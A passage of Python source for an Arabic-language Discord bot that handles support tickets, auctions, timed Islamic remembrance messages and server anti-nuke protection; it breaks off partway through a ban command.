import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
import os
import datetime
import random
import sqlite3
import time
import string as _string
import itertools
import aiohttp
from typing import Optional

TOKEN = os.getenv("TOKEN", "")
PREFIX = "y."
RENDER_URL = os.getenv("RENDER_URL", "")
if not TOKEN:
    raise RuntimeError("❌ TOKEN غير موجود")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
DB_FILE = "bot_data.db"

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS auctions (
        id INTEGER PRIMARY KEY AUTOINCREMENT, item_name TEXT, start_price INTEGER,
        current_price INTEGER, highest_bidder TEXT, end_time INTEGER,
        guild_id TEXT, channel_id TEXT, message_id TEXT, active INTEGER DEFAULT 1)""")
    c.execute("""CREATE TABLE IF NOT EXISTS warnings (
        id INTEGER PRIMARY KEY AUTOINCREMENT, user_id TEXT, guild_id TEXT,
        reason TEXT, moderator_id TEXT, timestamp TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS tickets (
        id INTEGER PRIMARY KEY AUTOINCREMENT, channel_id TEXT, user_id TEXT,
        guild_id TEXT, status TEXT DEFAULT 'open', claimed_by TEXT,
        ticket_type TEXT DEFAULT 'استفسار', opened_at TEXT, closed_by TEXT,
        close_reason TEXT, closed_at TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS protection (
        guild_id TEXT PRIMARY KEY, enabled INTEGER DEFAULT 1,
        punishment TEXT DEFAULT 'ban', whitelist TEXT DEFAULT '[]')""")
    c.execute("""CREATE TABLE IF NOT EXISTS dhikr (
        guild_id TEXT PRIMARY KEY, channel_id TEXT,
        interval_seconds INTEGER DEFAULT 10, enabled INTEGER DEFAULT 0)""")
    c.execute("""CREATE TABLE IF NOT EXISTS ticket_settings (
        guild_id TEXT PRIMARY KEY, mention_role_ids TEXT DEFAULT '[]',
        category_id TEXT, title TEXT DEFAULT 'تذكرة دعم',
        mention_admin INTEGER DEFAULT 1,
        ticket_types TEXT DEFAULT '["استفسار","شراء","شكوى","اقتراح","دعم فني"]')""")
    c.execute("""CREATE TABLE IF NOT EXISTS afk (
        user_id TEXT, guild_id TEXT, reason TEXT DEFAULT 'غايب',
        timestamp TEXT, PRIMARY KEY (user_id, guild_id))""")
    c.execute("""CREATE TABLE IF NOT EXISTS autorole (
        guild_id TEXT PRIMARY KEY, role_id TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS cmd_aliases (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        guild_id TEXT, alias TEXT, command TEXT)""")
    c.execute("""CREATE TABLE IF NOT EXISTS chatgpt (
        guild_id TEXT PRIMARY KEY, channel_id TEXT, enabled INTEGER DEFAULT 0)""")
    for col in [("tickets","ticket_type","TEXT DEFAULT 'استفسار'"),
                ("tickets","opened_at","TEXT"),("tickets","closed_by","TEXT"),
                ("tickets","close_reason","TEXT"),("tickets","closed_at","TEXT"),
                ("ticket_settings","mention_role_ids","TEXT DEFAULT '[]'"),
                ("ticket_settings","ticket_types","TEXT DEFAULT '[]'"),
                ("ticket_settings","close_reasons","TEXT DEFAULT '[]'")]:
        try: c.execute(f"ALTER TABLE {col[0]} ADD COLUMN {col[1]} {col[2]}")
        except: pass
    conn.commit(); conn.close()

def db_q(sql, params=(), fetch=None):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor(); c.execute(sql, params); conn.commit()
    r = c.fetchall() if fetch=="all" else c.fetchone() if fetch=="one" else None
    conn.close(); return r

def db_upsert(table, guild_id, **kw):
    conn = sqlite3.connect(DB_FILE); c = conn.cursor()
    c.execute(f"SELECT guild_id FROM {table} WHERE guild_id=?", (guild_id,))
    if c.fetchone():
        for k,v in kw.items(): c.execute(f"UPDATE {table} SET {k}=? WHERE guild_id=?", (v, guild_id))
    else:
        cols="guild_id,"+",".join(kw.keys()); ph="?,"+"?,"*len(kw); ph=ph.rstrip(",")
        c.execute(f"INSERT INTO {table} ({cols}) VALUES ({ph})", (guild_id,*kw.values()))
    conn.commit(); conn.close()

AZKAR = [
    "سبحان الله وبحمده، سبحان الله العظيم",
    "لا إله إلا الله وحده لا شريك له، له الملك وله الحمد وهو على كل شيء قدير",
    "اللهم صلِّ وسلِّم وبارك على سيدنا محمد وعلى آله وصحبه أجمعين",
    "استغفر الله العظيم وأتوب إليه",
    "لا حول ولا قوة إلا بالله العلي العظيم",
    "سبحان الله والحمد لله ولا إله إلا الله والله أكبر",
    "أستغفر الله الذي لا إله إلا هو الحي القيوم وأتوب إليه",
    "اللهم إنك عفو تحب العفو فاعفُ عنا",
    "رب اغفر لي وتب عليَّ إنك أنت التواب الرحيم",
    "سبحان الله وبحمده عدد خلقه، ورضا نفسه، وزنة عرشه، ومداد كلماته",
    "اللهم بك أصبحنا وبك أمسينا وبك نحيا وبك نموت وإليك النشور",
    "حسبي الله لا إله إلا هو عليه توكلت وهو رب العرش العظيم",
    "يا حيُّ يا قيومُ برحمتك أستغيث، أصلح لي شأني كله ولا تكلني إلى نفسي طرفة عين",
    "اللهم إني أسألك العفو والعافية في الدنيا والآخرة",
    "بسم الله الذي لا يضر مع اسمه شيء في الأرض ولا في السماء وهو السميع العليم",
    "اللهم أنت ربي لا إله إلا أنت، خلقتني وأنا عبدك",
    "سبحان الله ملء الميزان ومنتهى العلم ومبلغ الرضا وزنة العرش",
    "لا إله إلا الله المَلِكُ الحق المبين",
    "اللهم اجعلنا من الذاكرين لك الشاكرين لك",
    "الحمد لله الذي بنعمته تتم الصالحات",
    "اللهم اغفر لنا ذنوبنا وكفِّر عنا سيئاتنا وتوفَّنا مع الأبرار",
    "ربنا آتنا في الدنيا حسنة وفي الآخرة حسنة وقنا عذاب النار",
    "اللهم إني أعوذ بك من الهم والحزن والعجز والكسل",
    "توكلت على الله لا حول ولا قوة إلا بالله",
    "الله أكبر كبيرا، والحمد لله كثيرا، وسبحان الله بكرة وأصيلا",
]

SECONDARY_AZKAR = [
    "استغفر الله وأتوب إليه",
    "سبحان الله وبحمده",
    "لا إله إلا الله",
    "الله أكبر",
    "سبحان الله",
    "الحمد لله",
    "لا حول ولا قوة إلا بالله",
    "اللهم صل على محمد",
    "حسبي الله ونعم الوكيل",
    "توكلت على الله",
]

DHIKR_FOOTERS = [
    "اللهم ارزقنا الجنة",
    "اللهم اغفر لنا ولوالدينا",
    "اللهم تب علينا",
    "اللهم اجعلنا من عبادك الصالحين",
    "اللهم ارحمنا برحمتك",
    "اللهم اهدنا واهد بنا",
    "اللهم اجعل القرآن ربيع قلوبنا",
    "اللهم عافنا واعفُ عنا",
]

def _make_dhikr_embeds(bot_user=None):
    main_dhikr = random.choice(AZKAR)
    sec_dhikr  = random.choice(SECONDARY_AZKAR)
    footer_txt = random.choice(DHIKR_FOOTERS)

    e1 = discord.Embed(
        description=f"## {main_dhikr}",
        color=0x1B1D21
    )
    if bot_user:
        e1.set_author(name="اذكار البوت", icon_url=bot_user.display_avatar.url)

    repeated = f"> {sec_dhikr}\n> {sec_dhikr}\n> {sec_dhikr}"
    e2 = discord.Embed(description=repeated, color=0xF0EBE0)
    e2.set_footer(text=footer_txt)

    return [e1, e2]

OPENAI_API_KEY = os.getenv("OPENAI_API_KEY", "")
chatgpt_history = {}

dhikr_channels = {}; recent_deletions = {}; bot.start_time = datetime.datetime.utcnow()

@bot.event
async def on_ready():
    init_db(); print(f"✅ {bot.user}")
    try: synced = await bot.tree.sync(); print(f"✅ {len(synced)} أمر")
    except Exception as e: print(f"❌ {e}")
    for t in [check_auctions, send_dhikr, self_ping]:
        if not t.is_running(): t.start()

@tasks.loop(seconds=10)
async def send_dhikr():
    try:
        rows = db_q("SELECT guild_id,channel_id,interval_seconds FROM dhikr WHERE enabled=1", fetch="all") or []
        now = int(time.time())
        for guild_id, channel_id, interval in rows:
            if not channel_id: continue
            dhikr_channels.setdefault(guild_id, {"last_sent": 0})
            if now - dhikr_channels[guild_id]["last_sent"] >= interval:
                ch = bot.get_channel(int(channel_id))
                if ch:
                    try:
                        embeds = _make_dhikr_embeds(bot.user)
                        await ch.send(embeds=embeds)
                        dhikr_channels[guild_id]["last_sent"] = now
                    except: pass
    except Exception as ex: print(f"dhikr:{ex}")

@tasks.loop(minutes=1)
async def self_ping():
    if not RENDER_URL: return
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(RENDER_URL, timeout=aiohttp.ClientTimeout(total=10)) as r:
                print(f"[Ping] ✅ {r.status}")
    except Exception as e: print(f"[Ping] ⚠️ {e}")

@tasks.loop(seconds=30)
async def check_auctions():
    try:
        now = int(time.time())
        ended = db_q("SELECT * FROM auctions WHERE active=1 AND end_time<=?", (now,), fetch="all") or []
        for a in ended:
            aid,item,_,cur_p,bidder,_,_,ch_id,_,_ = a
            db_q("UPDATE auctions SET active=0 WHERE id=?", (aid,))
            if ch_id:
                ch = bot.get_channel(int(ch_id))
                if ch:
                    if bidder:
                        e = discord.Embed(title="🏆 انتهى المزاد!", color=discord.Color.gold())
                        e.add_field(name="السلعة", value=item); e.add_field(name="الفائز", value=f"<@{bidder}>"); e.add_field(name="السعر", value=f"{cur_p:,}")
                    else:
                        e = discord.Embed(title="❌ انتهى المزاد بدون مشاركين", color=discord.Color.red()); e.add_field(name="السلعة", value=item)
                    await ch.send(embed=e)
    except Exception as ex: print(f"auction:{ex}")

@bot.event
async def on_guild_channel_delete(channel):
    guild = channel.guild
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_delete):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            uid = str(guild.id)
            recent_deletions.setdefault(uid, {"channels":[],"roles":[]})
            recent_deletions[uid]["channels"].append({"user":e.user.id,"time":time.time()})
            recent_deletions[uid]["channels"] = [d for d in recent_deletions[uid]["channels"] if time.time()-d["time"]<60]
            if len([d for d in recent_deletions[uid]["channels"] if d["user"]==e.user.id]) >= 1:
                await apply_punishment(guild, e.user, row[1], f"حذف قناة: #{channel.name}")
    except Exception as ex: print(f"prot-ch:{ex}")

@bot.event
async def on_guild_role_delete(role):
    guild = role.guild
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.role_delete):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            uid = str(guild.id)
            recent_deletions.setdefault(uid, {"channels":[],"roles":[]})
            recent_deletions[uid]["roles"].append({"user":e.user.id,"time":time.time()})
            recent_deletions[uid]["roles"] = [d for d in recent_deletions[uid]["roles"] if time.time()-d["time"]<60]
            if len([d for d in recent_deletions[uid]["roles"] if d["user"]==e.user.id]) >= 1:
                await apply_punishment(guild, e.user, row[1], f"حذف رتبة: {role.name}")
    except Exception as ex: print(f"prot-role:{ex}")

@bot.event
async def on_member_ban(guild, user):
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.ban):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            await apply_punishment(guild, e.user, row[1], f"باند غير مصرح: {user}")
    except Exception as ex: print(f"prot-ban:{ex}")

@bot.event
async def on_member_remove(member):
    guild = member.guild
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.kick):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            if e.target.id != member.id: return
            uid = str(guild.id)
            recent_deletions.setdefault(uid, {"channels":[],"roles":[],"kicks":[]})
            recent_deletions[uid].setdefault("kicks", [])
            recent_deletions[uid]["kicks"].append({"user":e.user.id,"time":time.time()})
            recent_deletions[uid]["kicks"] = [d for d in recent_deletions[uid]["kicks"] if time.time()-d["time"]<60]
            if len([d for d in recent_deletions[uid]["kicks"] if d["user"]==e.user.id]) >= 2:
                await apply_punishment(guild, e.user, row[1], f"كيك جماعي غير مصرح")
    except Exception as ex: print(f"prot-kick:{ex}")

@bot.event
async def on_webhooks_update(channel):
    guild = channel.guild
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.webhook_create):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            await apply_punishment(guild, e.user, row[1], f"إنشاء ويب هوك غير مصرح")
    except Exception as ex: print(f"prot-webhook:{ex}")

@bot.event
async def on_guild_channel_create(channel):
    guild = channel.guild
    row = db_q("SELECT enabled,punishment,whitelist FROM protection WHERE guild_id=?", (str(guild.id),), fetch="one")
    if not row or not row[0]: return
    wl = json.loads(row[2] or "[]")
    try:
        async for e in guild.audit_logs(limit=1, action=discord.AuditLogAction.channel_create):
            if e.user.id == bot.user.id or str(e.user.id) in wl: return
            uid = str(guild.id)
            recent_deletions.setdefault(uid, {"channels":[],"roles":[],"kicks":[],"ch_creates":[]})
            recent_deletions[uid].setdefault("ch_creates", [])
            recent_deletions[uid]["ch_creates"].append({"user":e.user.id,"time":time.time()})
            recent_deletions[uid]["ch_creates"] = [d for d in recent_deletions[uid]["ch_creates"] if time.time()-d["time"]<30]
            if len([d for d in recent_deletions[uid]["ch_creates"] if d["user"]==e.user.id]) >= 3:
                await apply_punishment(guild, e.user, row[1], f"إنشاء قنوات مشبوه")
    except Exception as ex: print(f"prot-ch-create:{ex}")

async def apply_punishment(guild, user, punishment, reason):
    m = guild.get_member(user.id)
    if not m: return
    try:
        if punishment == "ban": await guild.ban(m, reason=f"🛡️ {reason}")
        elif punishment == "kick": await guild.kick(m, reason=f"🛡️ {reason}")
        elif punishment == "timeout":
            await m.timeout(discord.utils.utcnow()+datetime.timedelta(hours=24), reason=f"🛡️ {reason}")
        elif punishment == "strip":
            for r in m.roles[1:]:
                try: await m.remove_roles(r)
                except: pass
        lc = discord.utils.get(guild.channels, name="protection-log")
        if lc:
            e = discord.Embed(title="🛡️ الحماية", color=discord.Color.red())
            e.add_field(name="المخالف", value=f"{user.mention}"); e.add_field(name="السبب", value=reason); e.add_field(name="العقوبة", value=punishment)
            e.timestamp = discord.utils.utcnow(); await lc.send(embed=e)
    except Exception as ex: print(f"punishment:{ex}")

def get_ticket_settings(guild_id):
    return db_q("SELECT mention_role_ids,category_id,title,mention_admin,ticket_types,close_reasons FROM ticket_settings WHERE guild_id=?",
                (str(guild_id),), fetch="one")

def format_dt(dt=None):
    if dt is None: dt = datetime.datetime.now()
    days = ["Monday","Tuesday","Wednesday","Thursday","Friday","Saturday","Sunday"]
    months = ["January","February","March","April","May","June","July","August","September","October","November","December"]
    return f"{days[dt.weekday()]}, {months[dt.month-1]} {dt.day}, {dt.year} {dt.strftime('%I:%M %p')}"

class CustomTicketTypeModal(discord.ui.Modal, title="قسم التذكرة"):
    value = discord.ui.TextInput(label="اكتب قسم التذكرة", placeholder="مثال: استشارة قانونية...", max_length=50)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        await create_ticket_channel(interaction, self.value.value)

class TicketTypeSelect(discord.ui.View):
    def __init__(self, types):
        super().__init__(timeout=60)
        opts = [discord.SelectOption(label=t, value=t) for t in types[:5]]
        opts.append(discord.SelectOption(label="✏️ مخصص...", value="__custom__", description="اكتب قسمك الخاص"))
        sel = discord.ui.Select(placeholder="اختر نوع التذكرة...", options=opts, custom_id="ticket_type_sel")
        sel.callback = self.on_select; self.add_item(sel)

    async def on_select(self, interaction: discord.Interaction):
        ttype = interaction.data["values"][0]
        if ttype == "__custom__":
            await interaction.response.send_modal(CustomTicketTypeModal())
        else:
            await interaction.response.defer()
            await create_ticket_channel(interaction, ttype)
        self.stop()

async def create_ticket_channel(interaction: discord.Interaction, ticket_type: str):
    guild = interaction.guild
    s = get_ticket_settings(guild.id)
    existing = db_q("SELECT id FROM tickets WHERE user_id=? AND guild_id=? AND status='open'",
                    (str(interaction.user.id), str(guild.id)), fetch="one")
    if existing:
        try: await interaction.followup.send("❌ عندك تذكرة مفتوحة!", ephemeral=True)
        except: pass
        return
    category = guild.get_channel(int(s[1])) if s and s[1] else None
    title = (s[2] if s and s[2] else "تذكرة دعم")
    role_ids = json.loads(s[0]) if s and s[0] else []
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(view_channel=False),
        interaction.user: discord.PermissionOverwrite(view_channel=True, send_messages=True, attach_files=True),
        guild.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True),
    }
    for rid in role_ids:
        role = guild.get_role(int(rid))
        if role: overwrites[role] = discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True)
    ticket_num = (db_q("SELECT COUNT(*) FROM tickets WHERE guild_id=?", (str(guild.id),), fetch="one") or [0])[0] + 1
    ch = await guild.create_text_channel(
        name=f"ticket-{ticket_num}-{interaction.user.name[:10]}",
        category=category, overwrites=overwrites)
    opened_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    db_q("INSERT INTO tickets (channel_id,user_id,guild_id,status,ticket_type,opened_at) VALUES (?,?,?,'open',?,?)",
         (str(ch.id), str(interaction.user.id), str(guild.id), ticket_type, opened_at))
    mentions = " | ".join(f"<@&{rid}>" for rid in role_ids) if role_ids else "—"
    dt_str = format_dt()
    e = discord.Embed(title=f"🎫 {title}", color=0x5865F2)
    e.add_field(name="👤 مالك التذكرة", value=interaction.user.mention, inline=True)
    e.add_field(name="🛡️ مشرفي التذاكر", value=mentions, inline=True)
    e.add_field(name="📅 تاريخ التذكرة", value=dt_str, inline=False)
    e.add_field(name="🔢 رقم التذكرة", value=str(ticket_num), inline=True)
    e.add_field(name="❓ قسم التذكرة", value=ticket_type, inline=True)
    mention_txt = " ".join(f"<@&{rid}>" for rid in role_ids) if (s and s[3] and role_ids) else None
    view = TicketManageView()
    await ch.send(content=mention_txt, embed=e, view=view)
    try: await interaction.followup.send(f"✅ تذكرتك: {ch.mention}", ephemeral=True)
    except: pass

class TicketView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="📩 فتح تذكرة", style=discord.ButtonStyle.primary, custom_id="open_ticket")
    async def open_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        s = get_ticket_settings(interaction.guild.id)
        types = json.loads(s[4]) if s and s[4] else ["استفسار","شراء","شكوى","اقتراح","دعم فني"]
        if not types: types = ["استفسار","شراء","شكوى","اقتراح","دعم فني"]
        existing = db_q("SELECT id FROM tickets WHERE user_id=? AND guild_id=? AND status='open'",
                        (str(interaction.user.id), str(interaction.guild.id)), fetch="one")
        if existing:
            await interaction.response.send_message("❌ عندك تذكرة مفتوحة!", ephemeral=True); return
        e = discord.Embed(title="🎫 اختر نوع التذكرة", description="اختر قسم طلبك من القائمة أدناه:", color=0x5865F2)
        await interaction.response.send_message(embed=e, view=TicketTypeSelect(types), ephemeral=True)

async def do_close_ticket(interaction: discord.Interaction, reason: str):
    ch = interaction.channel
    row = db_q("SELECT user_id,opened_at,claimed_by FROM tickets WHERE channel_id=? AND status='open'", (str(ch.id),), fetch="one")
    if not row: await interaction.response.send_message("❌ تذكرة مغلقة.", ephemeral=True); return
    uid, opened_at, claimed_by = row
    closed_at = format_dt()
    db_q("UPDATE tickets SET status='closed',closed_by=?,close_reason=?,closed_at=? WHERE channel_id=?",
         (str(interaction.user.id), reason, closed_at, str(ch.id)))
    try:
        user = interaction.guild.get_member(int(uid))
        if user:
            e = discord.Embed(title="📋 تم إغلاق التذكرة", color=discord.Color.red())
            e.add_field(name="تم الفتح بواسطة", value=user.mention, inline=False)
            e.add_field(name="تم المطالبة بواسطة", value=f"<@{claimed_by}>" if claimed_by else "—", inline=False)
            e.add_field(name="تم الإغلاق بواسطة", value=interaction.user.mention, inline=False)
            e.add_field(name="وقت الفتح", value=opened_at or "—", inline=True)
            e.add_field(name="وقت الإغلاق", value=closed_at, inline=True)
            e.add_field(name="سبب الإغلاق", value=reason, inline=False)
            btn = discord.ui.View(); b = discord.ui.Button(label="عرض التذكرة", url=ch.jump_url, emoji="🔗"); btn.add_item(b)
            await user.send(embed=e, view=btn)
    except: pass
    await interaction.response.send_message("⏳ إغلاق خلال 3 ثواني...")
    await asyncio.sleep(3)
    try: await ch.delete()
    except: pass

class CustomCloseReasonModal(discord.ui.Modal, title="سبب الإغلاق"):
    value = discord.ui.TextInput(label="اكتب سبب الإغلاق", placeholder="مثال: انتهى الموضوع...", max_length=100)
    async def on_submit(self, interaction: discord.Interaction):
        await do_close_ticket(interaction, self.value.value)

class CloseReasonSelect(discord.ui.View):
    def __init__(self, reasons):
        super().__init__(timeout=60)
        nums = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣"]
        opts = [discord.SelectOption(label=f"{nums[i]} {r}", value=r) for i,r in enumerate(reasons[:5])]
        opts.append(discord.SelectOption(label="✏️ مخصص...", value="__custom__", description="اكتب سببك الخاص"))
        sel = discord.ui.Select(placeholder="اختر سبب الإغلاق...", options=opts)
        sel.callback = self.on_select; self.add_item(sel)
    async def on_select(self, interaction: discord.Interaction):
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ لا صلاحية.", ephemeral=True); return
        val = interaction.data["values"][0]
        if val == "__custom__":
            await interaction.response.send_modal(CustomCloseReasonModal())
        else:
            await do_close_ticket(interaction, val)
        self.stop()

class AddPersonModal(discord.ui.Modal, title="إضافة شخص للتذكرة"):
    user_id = discord.ui.TextInput(label="ID الشخص", placeholder="أدخل ID العضو...")
    async def on_submit(self, interaction: discord.Interaction):
        try:
            m = interaction.guild.get_member(int(self.user_id.value))
            if not m: await interaction.response.send_message("❌ عضو غير موجود.", ephemeral=True); return
            await interaction.channel.set_permissions(m, view_channel=True, send_messages=True)
            await interaction.response.send_message(f"✅ تمت إضافة {m.mention} للتذكرة.")
        except: await interaction.response.send_message("❌ ID غير صحيح.", ephemeral=True)

class TicketOptionsView(discord.ui.View):
    def __init__(self): super().__init__(timeout=60)

    @discord.ui.button(label="إغلاق بسبب", emoji="🔒", style=discord.ButtonStyle.danger)
    async def close_with_reason(self, interaction: discord.Interaction, b):
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ لا صلاحية.", ephemeral=True); return
        s = get_ticket_settings(interaction.guild.id)
        reasons = json.loads(s[5]) if s and s[5] else []
        if not reasons: reasons = ["تم الحل","مكتمل","رفض","مزيف","أخرى"]
        e = discord.Embed(title="🔒 اختر سبب الإغلاق", color=discord.Color.red())
        await interaction.response.send_message(embed=e, view=CloseReasonSelect(reasons), ephemeral=True)

    @discord.ui.button(label="إضافة شخص", emoji="👤", style=discord.ButtonStyle.secondary)
    async def add_person(self, interaction: discord.Interaction, b):
        if not interaction.user.guild_permissions.manage_channels:
            await interaction.response.send_message("❌ لا صلاحية.", ephemeral=True); return
        await interaction.response.send_modal(AddPersonModal())

    @discord.ui.button(label="تذكير العضو", emoji="✉️", style=discord.ButtonStyle.secondary)
    async def remind_user(self, interaction: discord.Interaction, b):
        row = db_q("SELECT user_id FROM tickets WHERE channel_id=? AND status='open'", (str(interaction.channel.id),), fetch="one")
        if not row: await interaction.response.send_message("❌ تذكرة مغلقة.", ephemeral=True); return
        try:
            m = interaction.guild.get_member(int(row[0]))
            if m:
                e = discord.Embed(title="⏰ تذكير بالتذكرة", description=f"تذكرتك في **{interaction.guild.name}** تنتظر ردك!", color=discord.Color.yellow())
                btn = discord.ui.View(); b2 = discord.ui.Button(label="عرض التذكرة", url=interaction.channel.jump_url, emoji="🔗"); btn.add_item(b2)
                await m.send(embed=e, view=btn)
                await interaction.response.send_message("✅ تم إرسال التذكير.", ephemeral=True)
            else: await interaction.response.send_message("❌ العضو غير موجود.", ephemeral=True)
        except: await interaction.response.send_message("❌ لم يتم الإرسال (الخاص مغلق).", ephemeral=True)

    @discord.ui.button(label="نسخة التذكرة", emoji="📄", style=discord.ButtonStyle.secondary)
    async def copy_ticket(self, interaction: discord.Interaction, b):
        row = db_q("SELECT user_id,ticket_type,opened_at FROM tickets WHERE channel_id=?", (str(interaction.channel.id),), fetch="one")
        if not row: await interaction.response.send_message("❌ لا معلومات.", ephemeral=True); return
        e = discord.Embed(title="📄 نسخة التذكرة", color=discord.Color.blue())
        e.add_field(name="القناة", value=interaction.channel.mention)
        e.add_field(name="العضو", value=f"<@{row[0]}>")
        e.add_field(name="النوع", value=row[1] or "—")
        e.add_field(name="وقت الفتح", value=row[2] or "—", inline=False)
        await interaction.response.send_message(embed=e, ephemeral=True)

class TicketManageView(discord.ui.View):
    def __init__(self): super().__init__(timeout=None)

    @discord.ui.button(label="استلام", emoji="🧰", style=discord.ButtonStyle.success, custom_id="claim_ticket")
    async def claim_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
        row = db_q("SELECT id,claimed_by FROM tickets WHERE channel_id=? AND status='open'", (str(interaction.channel.id),), fetch="one")
        if not row: await interaction.response.send_message("❌ التذكرة مغلقة.", ephemeral=True); return
        if row[1]: await interaction.response.send_message(f"❌ مستلمة من <@{row[1]}>", ephemeral=True); return
        db_q("UPDATE tickets SET claimed_by=? WHERE channel_id=?", (str(interaction.user.id), str(interaction.channel.id)))
        e = discord.Embed(description=f"✅ {interaction.user.mention} استلم التذكرة!", color=discord.Color.green())
        await interaction.response.send_message(embed=e)

    @discord.ui.button(label="خيارات التذكرة", emoji="🎫", style=discord.ButtonStyle.secondary, custom_id="ticket_options")
    async def ticket_options(self, interaction: discord.Interaction, button: discord.ui.Button):
        e = discord.Embed(title="🎫 اختر خياراً للتذكرة", color=0x5865F2)
        e.add_field(name="🔒 إغلاق بسبب", value="إغلاق التذكرة بسبب", inline=False)
        e.add_field(name="👤 إضافة شخص", value="إضافة شخص إلى التذكرة", inline=False)
        e.add_field(name="✉️ تذكير عبر الرسائل", value="إرسال تذكير للعضو في الخاص", inline=False)
        e.add_field(name="📄 طلب نسخة", value="طلب نسخة من التذكرة", inline=False)
        await interaction.response.send_message(embed=e, view=TicketOptionsView(), ephemeral=True)

@bot.tree.command(name="ticket-setup", description="إعداد التذاكر")
@app_commands.describe(channel="القناة", title="العنوان", role1="رتبة 1", role2="رتبة 2", role3="رتبة 3", role4="رتبة 4", role5="رتبة 5")
@app_commands.checks.has_permissions(administrator=True)
async def ticket_setup(interaction: discord.Interaction, channel: discord.TextChannel,
                       title: str = "تذكرة دعم",
                       role1: Optional[discord.Role]=None, role2: Optional[discord.Role]=None,
                       role3: Optional[discord.Role]=None, role4: Optional[discord.Role]=None,
                       role5: Optional[discord.Role]=None):
    roles = [r for r in [role1,role2,role3,role4,role5] if r]
    role_ids = json.dumps([str(r.id) for r in roles])
    db_upsert("ticket_settings", str(interaction.guild.id), mention_role_ids=role_ids, title=title, mention_admin=1)
    e = discord.Embed(title=f"🎫 {title}", description="اضغط على الزر أدناه لفتح تذكرة.", color=0x5865F2)
    if roles: e.add_field(name="🛡️ الإدارة المسؤولة", value=" | ".join(r.mention for r in roles))
    await channel.send(embed=e, view=TicketView())
    await interaction.response.send_message(f"✅ تذاكر جاهزة في {channel.mention}", ephemeral=True)

@bot.tree.command(name="ticket-category", description="كاتيغوري التذاكر")
@app_commands.describe(category="الكاتيغوري")
@app_commands.checks.has_permissions(administrator=True)
async def ticket_category(interaction: discord.Interaction, category: discord.CategoryChannel):
    db_upsert("ticket_settings", str(interaction.guild.id), category_id=str(category.id))
    await interaction.response.send_message(f"✅ الكاتيغوري: {category.name}")

@bot.tree.command(name="ticket-types", description="تعيين أنواع التذاكر (مفصولة بفاصلة)")
@app_commands.describe(types="مثال: استفسار,شراء,شكوى,اقتراح,دعم فني")
@app_commands.checks.has_permissions(administrator=True)
async def ticket_types_cmd(interaction: discord.Interaction, types: str):
    lst = [t.strip() for t in types.replace("،", ",").split(",") if t.strip()][:5]
    db_upsert("ticket_settings", str(interaction.guild.id), ticket_types=json.dumps(lst))
    await interaction.response.send_message(f"✅ أنواع التذاكر: {' | '.join(lst)}")

@bot.tree.command(name="ticket-close-reasons", description="تعيين أسباب إغلاق التذاكر (حتى 5)")
@app_commands.describe(reason1="سبب 1", reason2="سبب 2", reason3="سبب 3", reason4="سبب 4", reason5="سبب 5")
@app_commands.checks.has_permissions(administrator=True)
async def ticket_close_reasons(interaction: discord.Interaction,
                                reason1: str, reason2: Optional[str]=None,
                                reason3: Optional[str]=None, reason4: Optional[str]=None,
                                reason5: Optional[str]=None):
    lst = [r for r in [reason1, reason2, reason3, reason4, reason5] if r]
    db_upsert("ticket_settings", str(interaction.guild.id), close_reasons=json.dumps(lst))
    nums = ["1️⃣","2️⃣","3️⃣","4️⃣","5️⃣"]
    formatted = "\n".join(f"{nums[i]} {r}" for i,r in enumerate(lst))
    await interaction.response.send_message(f"✅ أسباب الإغلاق:\n{formatted}")

@bot.tree.command(name="ban", description="باند عضو")
@app_commands.describe(member="العضو", reason="السبب", delete_days="حذف رسائل")
@app_commands.checks.has_permissions(ban_members=True)
async def slash_ban(interaction: discord.Interaction, member: discord.Member, reason: str="—", delete_days: int=0):
    await interaction.guild.ban(member, reason=reason, delete_message_days=max(0,min(7,delete_days)))
    e = discord.Embed(title="🔨 تم الباند", color=discord.Color.red())
